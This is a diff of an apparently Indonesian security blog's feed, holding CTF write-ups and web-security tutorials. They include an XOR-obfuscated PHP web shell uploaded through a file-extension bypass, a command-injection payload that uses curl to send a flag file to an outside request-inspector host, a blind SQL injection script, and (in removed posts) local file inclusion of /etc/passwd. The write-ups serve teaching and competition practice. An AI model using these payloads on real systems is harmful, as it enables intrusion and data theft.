+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php if($error): ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;alert alert-danger&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;?php echo htmlspecialchars($error); ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php elseif($file): ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;alert alert-success&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">        File sukses terupload. &lt;a href=&#34;&lt;?php echo htmlspecialchars($file); ?&gt;&#34;&gt;Download&lt;/a&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php endif; ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php if($output !== null): ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php if($output === &#34;&#34;): ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;card-header alert alert-danger&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">          Tidak ada output atau terjadi error
+</span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php else: ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;card mb-3&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;card-header alert alert-success&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">          Output
+</span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;card-body&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">          &lt;code&gt;&lt;?php echo htmlspecialchars($output); ?&gt;&lt;/code&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php endif; ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;?php endif; ?&gt;
+</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">      &lt;div class=&#34;card mb-3&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;card-header&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">          Upload file Brainduck
+</span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;div class=&#34;card-body&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">          Contoh:
+</span><span style="color:#960050;background-color:#1e0010">          &lt;ul&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;li&gt;&lt;a href=&#34;examples/hello_world.bf&#34;&gt;Hello World!&lt;/a&gt;&lt;/li&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;li&gt;&lt;a href=&#34;examples/squares.bf&#34;&gt;Bilangan Kuadrat&lt;/a&gt;&lt;/li&gt;
+</span><span style="color:#960050;background-color:#1e0010">          &lt;/ul&gt;
+</span><span style="color:#960050;background-color:#1e0010">          &lt;form method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;input type=&#34;file&#34; name=&#34;file&#34; required&gt;
+</span><span style="color:#960050;background-color:#1e0010">            &lt;button type=&#34;submit&#34; class=&#34;btn btn-primary&#34;&gt;Upload&lt;/button&gt;
+</span><span style="color:#960050;background-color:#1e0010">          &lt;/form&gt;
+</span><span style="color:#960050;background-color:#1e0010">        &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">      &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">    &lt;/div&gt;
+</span><span style="color:#960050;background-color:#1e0010">  &lt;/body&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
+</span></code></pre></div><p>Sebenarnya tak ada hubungannya dengan brainfuck, jika kita melihat source diatas, kita dapat menyimpulkan bahwa vuln terdapat dibagian Upload File.</p>
 <p>Loh kok upload file?</p>
 <ol>
 <li>Karena bisa didownload/diakses</li>
@@ -581,7 +581,7 @@ Dengan cara merubah ekstensi menjadi namafile.ph.phpp, sehingga akan menjadi nam
 Dengan cara menggunakan XOR pada PHP, karena pada bahasa pemrograman PHP kita bisa melakukan String XOR.</p>
 <p>Kita akan melakukan XOR string &ldquo;<strong>`{{{</strong>&rdquo; dengan string &ldquo;<strong>?&lt;&gt;/</strong>&rdquo; yang dimana empat karakter tersebut jika diXOR akan menghasilkan _GET</p>
 <p>Lalu kita tinggal merangkainya menjadi sebuah shell:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?</span><span style="color:#f92672">=</span>$_<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;`{{{&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;?&lt;&gt;/&#34;</span>;${$_}[<span style="color:#a6e22e">_</span>](${$_}[<span style="color:#a6e22e">__</span>](${$_}[<span style="color:#a6e22e">___</span>]));
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?=</span>$_<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;`{{{&#34;</span><span style="color:#f92672">^</span><span style="color:#e6db74">&#34;?&lt;&gt;/&#34;</span>;${$_}[<span style="color:#a6e22e">_</span>](${$_}[<span style="color:#a6e22e">__</span>](${$_}[<span style="color:#a6e22e">___</span>]));
 </code></pre></div><p>lalu simpan dengan nama shell.ph.phpp dan langsung saja kita upload.</p>
 <p>Akhirnya kita bisa melakukan akses shell dengan mengakses alamat berikut:</p>
 <!-- raw HTML omitted -->
@@ -600,7 +600,7 @@ Dengan cara menggunakan XOR pada PHP, karena pada bahasa pemrograman PHP kita bi
             
             <guid>https://cacadosman.com/writeup-gemastik-11-troll/</guid>
             <description>Terdapat sebuah service yang memiliki source code berikut:
-&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;f&amp;#34; id=&amp;#34;f&amp;#34; &amp;gt;&amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Check&amp;#34; onclick=&amp;#34;ck()&amp;#34;&amp;gt;&amp;lt;script&amp;gt;ll = &amp;#34;length&amp;#34;;ca = &amp;#34;charCodeAt&amp;#34;function k(c) {return (c==&amp;#39;O&amp;#39;||c==&amp;#39;0&amp;#39;);}function n(){for (; !k(a[i])&amp;amp;&amp;amp; i&amp;lt;a[ll]; i++);}function ck(){a = troll.innerHTML;bb = {}for(i =0; i &amp;lt; 127; i++) {s = &amp;#34;&amp;#34;;for (j = 6; j &amp;gt;=0 ; j--) {s += (i &amp;amp; (1&amp;lt;&amp;lt;j))?</description>
+&amp;lt;html&amp;gt; &amp;lt;head&amp;gt;&amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;f&amp;#34; id=&amp;#34;f&amp;#34; &amp;gt;&amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Check&amp;#34; onclick=&amp;#34;ck()&amp;#34;&amp;gt; &amp;lt;script&amp;gt; ll = &amp;#34;length&amp;#34;; ca = &amp;#34;charCodeAt&amp;#34; function k(c) { return (c==&amp;#39;O&amp;#39;||c==&amp;#39;0&amp;#39;); } function n(){ for (; !k(a[i])&amp;amp;&amp;amp; i&amp;lt;a[ll]; i++); } function ck(){ a = troll.innerHTML; bb = {} for(i =0; i &amp;lt; 127; i++) { s = &amp;#34;&amp;#34;; for (j = 6; j &amp;gt;=0 ; j--) { s += (i &amp;amp; (1&amp;lt;&amp;lt;j))?</description>
             <content type="html"><![CDATA[<p>Terdapat sebuah service yang memiliki source code berikut:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">html</span>&gt;
 &lt;<span style="color:#f92672">head</span>&gt;&lt;/<span style="color:#f92672">head</span>&gt;
@@ -796,7 +796,7 @@ Kita eksekusi dengan memasukkan payload berikut</description>
 <p>Kita akan membypassnya menggunakan command curl yang dibungkus dengan $() dan mengoper responsenya  ke HTTP Request Inspector</p>
 <p><a href="http://reqbin.cacadosman.web.id/v0b9bnv0?inspect">http://reqbin.cacadosman.web.id/v0b9bnv0?inspect</a></p>
 <p>Kita eksekusi dengan memasukkan payload berikut</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">$(</span>curl --data <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">flag=</span><span style="color:#66d9ef">$(</span>cat /home/node/flag.txt<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> http://reqbin.cacadosman.web.id/v0b9bnv0<span style="color:#66d9ef">)</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#66d9ef">$(</span>curl --data <span style="color:#e6db74">&#34;flag=</span><span style="color:#66d9ef">$(</span>cat /home/node/flag.txt<span style="color:#66d9ef">)</span><span style="color:#e6db74">&#34;</span> http://reqbin.cacadosman.web.id/v0b9bnv0<span style="color:#66d9ef">)</span>
 </code></pre></div><p>BIMSALABIM AVADA KADAVRA</p>
 <p><img src="/wp-content/2018/07/headins2.png" alt=""></p>
 <p><strong>SlashRootCTF{b3c0me_a_cvvvrL_n1nj4!}</strong></p>
@@ -812,22 +812,22 @@ Kita eksekusi dengan memasukkan payload berikut</description>
             <description>Walaupun SQL Injection tergolong vuln yang sudah sangat tua, namun masih saja banyak programmer yang belum mengetahui bahaya dari SQL Injection. Sehingga banyak sekali website yang mudah terkena deface. Kali ini saya ingin memberikan cara mudah untuk mencegah SQL Injection dengan menggunakan prepared statement.
 Untuk kali ini, contoh kasusnya kita menggunakan bahasa pemrograman PHP. Karena bahasa tersebut merupakan salah satu bahasa yang paling banyak penggunanya.
 PDO:
-$conn = new PDO(&amp;#34;mysql:host=$db_servername;dbname=$dbname&amp;#34;, $db_username, $db_password);$stmt = $conn-&amp;gt;prepare(&amp;#34;SELECT * FROM posts WHERE id=:id&amp;#34;);$stmt-&amp;gt;bindParam(&amp;#34;:id&amp;#34;, $post_id);$stmt-&amp;gt;execute();$posts = $stmt-&amp;gt;fetchAll();Mysqli:</description>
+$conn = new PDO(&amp;#34;mysql:host=$db_servername;dbname=$dbname&amp;#34;, $db_username, $db_password); $stmt = $conn-&amp;gt;prepare(&amp;#34;SELECT * FROM posts WHERE id=:id&amp;#34;); $stmt-&amp;gt;bindParam(&amp;#34;:id&amp;#34;, $post_id); $stmt-&amp;gt;execute(); $posts = $stmt-&amp;gt;fetchAll(); Mysqli:</description>
             <content type="html"><![CDATA[<p>Walaupun SQL Injection tergolong vuln yang sudah sangat tua, namun masih saja banyak programmer yang belum mengetahui bahaya dari SQL Injection. Sehingga banyak sekali website yang mudah terkena deface. Kali ini saya ingin memberikan cara mudah untuk mencegah SQL Injection dengan menggunakan prepared statement.</p>
 <p>Untuk kali ini, contoh kasusnya kita menggunakan bahasa pemrograman PHP. Karena bahasa tersebut merupakan salah satu bahasa yang paling banyak penggunanya.</p>
 <p><strong>PDO:</strong></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$conn = new PDO(&#34;mysql:host=$db_servername;dbname=$dbname&#34;, $db_username, $db_password);
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">PDO</span>(<span style="color:#e6db74">&#34;mysql:host=</span><span style="color:#e6db74">$db_servername</span><span style="color:#e6db74">;dbname=</span><span style="color:#e6db74">$dbname</span><span style="color:#e6db74">&#34;</span>, $db_username, $db_password);
 
-$stmt = $conn-&gt;prepare(&#34;SELECT * FROM posts WHERE id=:id&#34;);
-$stmt-&gt;bindParam(&#34;:id&#34;, $post_id);
-$stmt-&gt;execute();
+$stmt <span style="color:#f92672">=</span> $conn<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;SELECT * FROM posts WHERE id=:id&#34;</span>);
+$stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bindParam</span>(<span style="color:#e6db74">&#34;:id&#34;</span>, $post_id);
+$stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>();
 
-$posts = $stmt-&gt;fetchAll();
+$posts <span style="color:#f92672">=</span> $stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">fetchAll</span>();
 </code></pre></div><p><strong>Mysqli:</strong></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$conn = new mysqli($db_servername, $db_username, $db_password, $db_name);
-$stmt = $conn-&gt;prepare(&#34;INSERT INTO posts (title, author, content) VALUES (?, ?, ?)&#34;);
-$stmt-&gt;bind_param(&#34;sss&#34;, $post_title, $post_author, $post_content);
-$stmt-&gt;execute();
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$conn <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">mysqli</span>($db_servername, $db_username, $db_password, $db_name);
+$stmt <span style="color:#f92672">=</span> $conn<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prepare</span>(<span style="color:#e6db74">&#34;INSERT INTO posts (title, author, content) VALUES (?, ?, ?)&#34;</span>);
+$stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">bind_param</span>(<span style="color:#e6db74">&#34;sss&#34;</span>, $post_title, $post_author, $post_content);
+$stmt<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>();
 </code></pre></div><p>Dengan menggunakan method prepare dan bind_param, kita dapat mencegah SQL Injection.</p>
 <p>Semoga bermanfaat, terima kasih.</p>
 ]]></content>
@@ -851,20 +851,20 @@ Setelah kita analisa ternyata menggunakan SQLite dan query union ternyata difilt
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> requests <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#f92672">import</span> base64
 
-url <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">http://35.187.236.126:8013/data.php</span><span style="color:#e6db74">&#34;</span>
-charlist <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">abcdefghijklmnopqrstuvwxyz1234567890 _,)(:}{</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://35.187.236.126:8013/data.php&#34;</span>
+charlist <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdefghijklmnopqrstuvwxyz1234567890 _,)(:}{</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
 temp <span style="color:#f92672">=</span> []
 <span style="color:#66d9ef">while</span>(True):
-   temp <span style="color:#f92672">+</span><span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">a</span><span style="color:#e6db74">&#34;</span>]
+   temp <span style="color:#f92672">+=</span> [<span style="color:#e6db74">&#34;a&#34;</span>]
    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(charlist)):
        temp[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> charlist[i]
-       res <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>join(temp)
-       <span style="color:#75715e">#payload = &#34;(select CASE WHEN (SELECT group_concat(tbl_name,&#39;:&#39;) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;) like &#39;&#34; + res + &#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
-       <span style="color:#75715e">#payload = &#34;(select CASE WHEN (SELECT sql FROM sqlite_master WHERE type!=&#39;meta&#39; AND sql NOT NULL AND name NOT LIKE &#39;sqlite_%&#39;) like &#39;&#34; + res + &#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
-       payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">(select CASE WHEN (select group_concat(admin_id) from n1mbusadmin) like </span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> res <span style="color:#f92672">+</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> THEN 1 ELSE 0 END)</span><span style="color:#e6db74">&#34;</span>
+       res <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(temp)
+       <span style="color:#75715e">#payload = &#34;(select CASE WHEN (SELECT group_concat(tbl_name,&#39;:&#39;) FROM sqlite_master WHERE type=&#39;table&#39; and tbl_name NOT like &#39;sqlite_%&#39;) like &#39;&#34; + res + &#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
+       <span style="color:#75715e">#payload = &#34;(select CASE WHEN (SELECT sql FROM sqlite_master WHERE type!=&#39;meta&#39; AND sql NOT NULL AND name NOT LIKE &#39;sqlite_%&#39;) like &#39;&#34; + res + &#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
+       payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;(select CASE WHEN (select group_concat(admin_id) from n1mbusadmin) like &#39;&#34;</span> <span style="color:#f92672">+</span> res <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;%&#39; THEN 1 ELSE 0 END)&#34;</span>
        p64 <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64encode(payload)
-       r <span style="color:#f92672">=</span> post(url, data<span style="color:#f92672">=</span>{<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">id</span><span style="color:#e6db74">&#34;</span>:p64})
-       <span style="color:#66d9ef">if</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">Lorem Ipsum</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
+       r <span style="color:#f92672">=</span> post(url, data<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;id&#34;</span>:p64})
+       <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;Lorem Ipsum&#34;</span> <span style="color:#f92672">in</span> r<span style="color:#f92672">.</span>text:
            <span style="color:#66d9ef">print</span> res
            <span style="color:#66d9ef">break</span>
        <span style="color:#66d9ef">else</span>:
@@ -887,74 +887,6 @@ Value:
 <p><img src="/wp-content/2018/07/btpsqli3.png" alt=""></p>
 <p>Maka muncul login form dan langsung saja kita masukkan id dan passwordnya dan VOILA kita mendapatkan sebuah FLAG</p>
 <p><strong>FLAG: B2P{af39e6e718f3fb8f2de9ae9e6464b150}</strong></p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Web Security Basic - Local File Inclusion</title>
-            <link>https://cacadosman.com/2018/07/21/web-security-basic-local-file-inclusion/</link>
-            <pubDate>Sat, 21 Jul 2018 08:21:07 +0000</pubDate>
-            
-            <guid>https://cacadosman.com/2018/07/21/web-security-basic-local-file-inclusion/</guid>
-            <description>Apa itu LFI?
-Local File Inclusion memungkinkan kita untuk melakukan inklusi/include sebuah file (Mengeksekusi/membaca file lain yang berada pada server yang seharusnya tidak boleh kita eksekusi diluar prosedur)
-Apa itu include?
-http://php.net/manual/en/function.include.php
-Latihan:
-Mari kita buka url berikut ini
-http://ctf.asgama.tk:40004/
-Terdapat menu home dan kontak, serta terdapat sebuah source code.
-Mari kita buka source code tsb.
-&amp;lt;?php if(isset($_GET[&amp;quot;page&amp;quot;])): ?&amp;gt;&amp;lt;p&amp;gt;&amp;lt;?php include $_GET[&amp;quot;page&amp;quot;]; ?&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;?php else: ?&amp;gt;&amp;lt;p&amp;gt;Nothing to do here&amp;lt;/p&amp;gt;&amp;lt;?</description>
-            <content type="html"><![CDATA[<p>Apa itu LFI?</p>
-<p>Local File Inclusion memungkinkan kita untuk melakukan inklusi/include sebuah file (Mengeksekusi/membaca file lain yang berada pada server yang seharusnya tidak boleh kita eksekusi diluar prosedur)</p>
-<p>Apa itu include?</p>
-<p><a href="https://www.google.com/url?q=http://php.net/manual/en/function.include.php&amp;sa=D&amp;ust=1532108601692000">http://php.net/manual/en/function.include.php</a></p>
-<p>Latihan:</p>
-<p>Mari kita buka url berikut ini</p>
-<p><a href="https://www.google.com/url?q=http://ctf.asgama.tk:40004/&amp;sa=D&amp;ust=1532108601693000">http://ctf.asgama.tk:40004/</a></p>
-<p>Terdapat menu home dan kontak, serta terdapat sebuah source code.</p>
-<p>Mari kita buka source code tsb.</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<pre><code>&lt;?php if(isset($_GET[&quot;page&quot;])): ?&gt;
-       &lt;p&gt;&lt;?php include $_GET[&quot;page&quot;]; ?&gt;&lt;/p&gt;
-   &lt;?php else: ?&gt;
-       &lt;p&gt;Nothing to do here&lt;/p&gt;
-   &lt;?php endif; ?&gt;
-</code></pre>
-<!-- raw HTML omitted -->
-<p>Dari kode diatas, kita bisa mengetahui bahwa web tsb melakukan inklusi/include dengan parameter $_GET[“page”], bisa kita ketahui saat kita membuka menu kontak.</p>
-<p><img src="/wp-content/2018/07/image20.png" alt=""></p>
-<p>Artinya, isi dari contact.php adalah berupa kontak line.</p>
-<p><img src="/wp-content/2018/07/image29.png" alt=""></p>
-<p>Lalu secara default (pada halaman home) maka akan muncul teks “Nothing to do here” karena tidak terdapat parameter page pada url (GET Method)</p>
-<p>Oleh karena itu, kita bisa mengetahui bahwa web tersebut kemungkinan bisa diinjeksi dengan path/lokasi dari suatu file untuk menginklusi/include file tersebut.</p>
-<p>Misalkan kita ingin menginklusi file /etc/passwd, maka kita langsung saja menginjeksikannya pada parameter page</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p><a href="http://ctf.asgama.tk:40004/index.php?page=/etc/passwd">http://ctf.asgama.tk:40004/index.php?page=/etc/passwd</a></p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p>Tadaa, ternyata vuln terhadap LFI</p>
-<p><img src="/wp-content/2018/07/image9.png" alt=""></p>
-<p>Kita belum mendapatkan flagnya, coba kita cek source code halaman tsb.</p>
-<p><img src="/wp-content/2018/07/image27.png" alt=""></p>
-<p>Terdapat hal yang menarik, yaitu lokasi flag ada di bendera/flag.txt</p>
-<p>Oke langsung saja kita injeksi kedalam parameter page di url.</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<blockquote>
-<p><a href="http://ctf.asgama.tk:40004/index.php?page=bendera/flag.txt">http://ctf.asgama.tk:40004/index.php?page=bendera/flag.txt</a></p>
-</blockquote>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<p><img src="/wp-content/2018/07/image32.png" alt=""></p>
-<p>Yay kita mendapatkan flagnya :3</p>
 ]]></content>
         </item>
         
@@ -1038,490 +970,6 @@ Macam-macam vuln XSS:</description>
 
 ?&gt;
 </code></pre>]]></content>
-        </item>
-        
-        <item>
-            <title>Web Security Basic - Kodingmu Harimaumu</title>
-            <link>https://cacadosman.com/2018/07/21/web-security-basic-kodingmu-harimaumu/</link>
-            <pubDate>Sat, 21 Jul 2018 08:03:55 +0000</pubDate>
-            
-            <guid>https://cacadosman.com/2018/07/21/web-security-basic-kodingmu-harimaumu/</guid>
-            <description>Jangan sepelekan koding, mungkin iya project kita bisa selesai. Namun belum tentu apa yang kita koding itu aman, kadang masih meninggalkan celah keamanan.
-Biasanya celah keamanan ditemukan pada input yang tidak difilter maupun kesalahan penggunaan fungsi bawaan yang deprecated, jadi kita bisa dengan mudah melakukan injeksi pada form input.
-Salah satu poin penting disini ialah Jangan Percaya Inputan User.
-Contoh Soal:
-Berikut adalah contoh soal dengan celah keamanan pada fungsi bawaan php yaitu strcmp yang berfungsi untuk membandingkan nilai.</description>
-            <content type="html"><![CDATA[<p>Jangan sepelekan koding, mungkin iya project kita bisa selesai. Namun belum tentu apa yang kita koding itu aman, kadang masih meninggalkan celah keamanan.</p>
-<p>Biasanya celah keamanan ditemukan pada input yang tidak difilter maupun kesalahan penggunaan fungsi bawaan yang deprecated, jadi kita bisa dengan mudah melakukan injeksi pada form input.</p>
-<p>Salah satu poin penting disini ialah Jangan Percaya Inputan User.</p>
-<p>Contoh Soal:</p>
-<p>Berikut adalah contoh soal dengan celah keamanan pada fungsi bawaan php yaitu strcmp yang berfungsi untuk membandingkan nilai.</p>
-<p>Mari kita buka url berikut:</p>
-<p><a href="https://www.google.com/url?q=http://ctf.asgama.tk:40002/&amp;sa=D&amp;ust=1532108601659000">http://ctf.asgama.tk:40002/</a></p>
-<p>Terdapat form login, kita disuruh memasukkan password pada form tersebut.</p>
-<p>Namun, kita tidak mengetahui passwordnya.</p>
-<p>Terdapat sebuah hint berupa source code yang terdapat pada /source.txt</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
-<pre><code>if(isset($_POST[&quot;password&quot;])){
-       $password_input = $_POST[&quot;password&quot;];
-
-       if(strcmp($password_input, $password) == 0){
-           $loggedin = true;
-       }
-   }
-</code></pre>
-<!-- raw HTML omitted -->
-<p>Terdapat pengecekan nilai menggunakan strcmp. Fungsi strcmp sendiri akan mengembalikan nilai 0 apabila kedua nilai itu sama.</p>
-<p>Sumber: <a href="https://www.google.com/url?q=http://php.net/manual/en/function.strcmp.php&amp;sa=D&amp;ust=1532108601661000">http://php.net/manual/en/function.strcmp.php</a></p>
-<p>Akan tetapi, strcmp memiliki kelemahan jika membandingkan array. Hasilnya akan menjadi null dan mengeluarkan sebuah warning.</p>
-<p>Oleh karena itu karena null == 0 itu menghasilkan nilai true, kita bisa langsung mengakalinya dengan menginputkan sebuah array pada form.</p>
-<p>Caranya? cukup dengan inspect element.</p>
-<p><img src="/wp-content/2018/07/image1.png" alt=""></p>
-<p>Lakukan inspect element pada form login, lalu ubah dari name=”password” menjadi name=”password[]” yang artinya kita akan mempassing parameter berupa array, sehingga kita bisa mempypass strcmp. Setelah itu kita tinggal tekan tombol login.</p>
-<p><img src="/wp-content/2018/07/image5.png" alt=""></p>
-<p>Selamat, kita mendapatkan sebuah flag.</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Web Security Basic - Bahasa Pemrograman</title>
-            <link>https://cacadosman.com/2018/07/21/web-security-basic-bahasa-pemrograman/</link>
-            <pubDate>Sat, 21 Jul 2018 02:18:21 +0000</pubDate>
-            
-            <guid>https://cacadosman.com/2018/07/21/web-security-basic-bahasa-pemrograman/</guid>
-            <description>Semua aplikasi pastinya dibuat dengan menggunakan bahasa pemrograman, oleh karena itu agar kita dapat menemukan suatu celah keamanan dari aplikasi kita harus menguasai bahasa pemrograman terlebih dahulu untuk dapat menganalisa source code (baik source code utuh maupun dengan reverse engineering). Kebanyakan anak jaman now seringkali saya jumpai ingin menjadi hacker tapi secara instan dengan mengandalkan tools dan dorking, namun malas untuk mempelajari dasar bahasa pemrograman dan konsep dari eksploitasinya. Hal seperti itulah yang harus kita hindari, kita harus mempunyai pondasi yang mantap sebelum ke tahap selanjutnya.</description>
-            <content type="html"><![CDATA[<p>Semua aplikasi pastinya dibuat dengan menggunakan bahasa pemrograman, oleh karena itu agar kita dapat menemukan suatu celah keamanan dari aplikasi kita harus menguasai bahasa pemrograman terlebih dahulu untuk dapat menganalisa source code (baik source code utuh maupun dengan reverse engineering). Kebanyakan anak jaman now seringkali saya jumpai ingin menjadi hacker tapi secara instan dengan mengandalkan tools dan dorking, namun malas untuk mempelajari dasar bahasa pemrograman dan konsep dari eksploitasinya. Hal seperti itulah yang harus kita hindari, kita harus mempunyai pondasi yang mantap sebelum ke tahap selanjutnya.</p>
-<p><strong>HTML (HyperText Markup Language)</strong></p>
-<p>Hal yang perlu diperhatikan ialah HTML bukan bahasa pemrograman.</p>
-<p>HTML sendiri ialah bahasa markup yang digunakan untuk membuat struktur sebuah halaman web (Seperti rangka pada tubuh).</p>
-<p>Lalu apa pentingnya HTML ?</p>
